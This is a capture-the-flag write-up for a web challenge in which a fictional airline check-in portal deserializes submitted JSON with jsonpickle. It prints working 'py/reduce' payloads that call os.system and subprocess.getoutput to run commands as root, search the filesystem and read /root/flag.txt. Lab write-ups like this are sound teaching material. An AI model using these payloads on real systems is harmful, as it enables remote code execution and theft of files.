# Jsonjigsaw

## Challenge Overview

SkyLine Air has just launched its brand new Smart Check-in portal. Passengers submit a passenger manifest to the portal and the system issues a boarding pass. The airline brags that the entire check-in process has gone digital, so no manual data entry is needed anymore. The terminal keeps a secret stored in the check-in server's filesystem. Your goal is to recover the flag. The web portal is the only service exposed, so everything must be done through it.

---

## Evidence

The challenge exposes a single web application at the provided URL. The landing page presents a form that accepts a JSON passenger manifest and POSTs it to `/api/checkin`.

Server response headers identify the stack:

```
Server: Werkzeug/3.1.8 Python/3.11.16
```

---

## Analysis

### Application Behaviour

A normal manifest produces a structured boarding pass:

```json
{
  "name": "Ada Lovelace",
  "flight": "SL-042",
  "seat": "14A",
  "gate": "B7"
}
```

```json
{
  "boarding_pass": {
    "flight": "SL-042",
    "gate": "B7",
    "passenger": "Ada Lovelace",
    "seat": "14A"
  },
  "status": "ok"
}
```

Sending non-object values (arrays, strings, numbers, null) simply echoes the input back as the boarding pass. Extra or unexpected keys are silently ignored. Invalid JSON returns a generic error message.

### Identifying the Deserialization Sink

The presence of a Python/Flask backend together with unrestricted acceptance of complex JSON structures suggested an unsafe deserializer. Testing a classic jsonpickle reduce gadget immediately confirmed the vulnerability:

```json
{"py/reduce": [{"py/type": "os.system"}, ["id"]]}
```

Response:

```json
{"boarding_pass": 0, "status": "ok"}
```

`os.system` returns the process exit code (0). The application is deserializing the submitted JSON with **jsonpickle**.

### Remote Code Execution

Switching to a callable that returns stdout yields full command output:

```json
{"py/reduce": [{"py/type": "subprocess.getoutput"}, ["id"]]}
```

```json
{
  "boarding_pass": "uid=0(root) gid=0(root) groups=0(root)",
  "status": "ok"
}
```

The process runs as root.

### Locating and Reading the Flag

A filesystem search reveals the secret:

```json
{"py/reduce": [{"py/type": "subprocess.getoutput"}, ["find / -name '*flag*' 2>/dev/null"]]}
```

The interesting path is `/root/flag.txt`. Reading it recovers the flag:

```json
{"py/reduce": [{"py/type": "subprocess.getoutput"}, ["cat /root/flag.txt"]]}
```

---

## Flag

```
flag{[YOUR FLAG HERE]}
```

---

## Tools Used

- `curl` (API interaction and payload delivery)
- Python 3 (payload experimentation)
- Browser developer tools (initial request inspection)
